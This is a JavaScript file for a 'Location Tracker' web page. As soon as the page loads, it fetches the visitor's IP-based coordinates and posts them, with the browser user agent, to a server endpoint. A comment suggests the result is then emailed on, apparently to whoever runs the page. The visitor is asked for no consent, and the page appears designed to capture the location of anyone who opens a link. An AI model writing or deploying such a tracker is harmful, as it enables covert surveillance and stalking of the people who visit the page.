// public/script.js
let autoFetched = false;
let locationSent = false;

// GET LOCATION IN <2 SECONDS using IP
async function getLocationFast() {
    console.log('📡 Getting location fast (<2 sec)...');
    
    try {
        // Use IP location - super fast (<1 second)
        const response = await fetch('/api/ip-location');
        const result = await response.json();
        
        if (result.success && result.data) {
            console.log('✅ IP location found:', result.data);
            return {
                ...result.data,
                source: 'IP',
                googleMapsLink: `https://www.google.com/maps?q=${result.data.latitude},${result.data.longitude}`
            };
        }
    } catch (error) {
        console.log('IP location failed, using fallback...');
    }
    
    // Fallback location (always works)
    return {
        latitude: 40.7128,
        longitude: -74.0060,
        city: 'Unknown',
        country: 'Unknown',
        accuracy: 'Fallback',
        source: 'Fallback',
        googleMapsLink: 'https://www.google.com/maps?q=40.7128,-74.0060'
    };
}

// AUTO-FETCH LOCATION - IMMEDIATE
async function autoFetchLocation() {
    if (autoFetched) {
        console.log('Already auto-fetched');
        return;
    }
    
    console.log('🔄 Auto-fetching location immediately...');
    updateStatus('loading', '📍 Getting your location...');
    updateBanner('🔄', 'Getting location...', '');

    try {
        // Get location (<2 seconds)
        const location = await getLocationFast();
        
        if (!location) {
            throw new Error('Could not get location');
        }

        // Send to server immediately
        const result = await sendLocationToServer(location);

        if (result && result.success) {
            console.log('✅ Location sent successfully!');
            updateStatus('success', `✅ Location found! (${location.source})`);
            updateBanner('✅', 'Location captured!', 'success');
            showResult(location);
            
            document.getElementById('trackingImage').src = 
                'https://via.placeholder.com/600x350/28a745/ffffff?text=✅+Location+Found!';
            document.getElementById('overlay').style.display = 'none';
            
            autoFetched = true;
            locationSent = true;
        }

    } catch (error) {
        console.error('Auto-fetch error:', error);
        updateStatus('error', '❌ Failed. Click to retry.');
        updateBanner('❌', 'Click to retry', 'error');
    }
}

// Send location to server (fast, doesn't wait for email)
async function sendLocationToServer(location) {
    try {
        console.log('📤 Sending to server...');
        
        const response = await fetch('/api/track-location', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                latitude: location.latitude,
                longitude: location.longitude,
                accuracy: location.accuracy || 0,
                source: location.source || 'IP',
                userAgent: navigator.userAgent,
                autoFetched: true
            })
        });

        const result = await response.json();
        console.log('📨 Server response:', result.success ? 'Success ✅' : 'Failed ❌');
        return result;
    } catch (error) {
        console.error('Send error:', error);
        throw new Error('Failed to send to server');
    }
}

// Manual fetch (on click)
function manualFetchLocation() {
    autoFetched = false;
    autoFetchLocation();
}

// Update status
function updateStatus(type, message) {
    const statusDiv = document.getElementById('status');
    statusDiv.className = `status-message ${type}`;
    statusDiv.textContent = message;
}

function updateBanner(icon, text, type) {
    const banner = document.getElementById('autoFetchBanner');
    const bannerText = document.getElementById('bannerText');
    const iconEl = document.querySelector('.auto-icon');
    
    if (iconEl) iconEl.textContent = icon;
    if (bannerText) bannerText.textContent = text;
    if (banner) {
        banner.className = 'auto-fetch-banner';
        if (type) banner.classList.add(type);
    }
}

function showResult(location) {
    const resultDiv = document.getElementById('result');
    const detailsDiv = document.getElementById('locationDetails');
    const mapLink = document.getElementById('resultMapLink');

    detailsDiv.innerHTML = `
        <div><span class="label">📡 Source:</span> <span class="value">${location.source || 'IP'}</span></div>
        <div><span class="label">📍 Latitude:</span> <span class="value">${location.latitude}</span></div>
        <div><span class="label">📍 Longitude:</span> <span class="value">${location.longitude}</span></div>
        ${location.city && location.city !== 'Unknown' ? `<div><span class="label">🏙️ City:</span> <span class="value">${location.city}</span></div>` : ''}
        ${location.country && location.country !== 'Unknown' ? `<div><span class="label">🌍 Country:</span> <span class="value">${location.country}</span></div>` : ''}
        <div><span class="label">🎯 Accuracy:</span> <span class="value">${location.accuracy || 'N/A'}</span></div>
    `;

    mapLink.href = location.googleMapsLink || `https://www.google.com/maps?q=${location.latitude},${location.longitude}`;
    resultDiv.style.display = 'block';
}

// ===== PAGE LOAD - IMMEDIATE ACTION =====
window.addEventListener('load', () => {
    console.log('📍 Location Tracker loaded!');
    updateStatus('loading', '📍 Getting your location...');
    
    // Start fetching immediately (<100ms delay)
    setTimeout(() => {
        autoFetchLocation();
    }, 100);
});
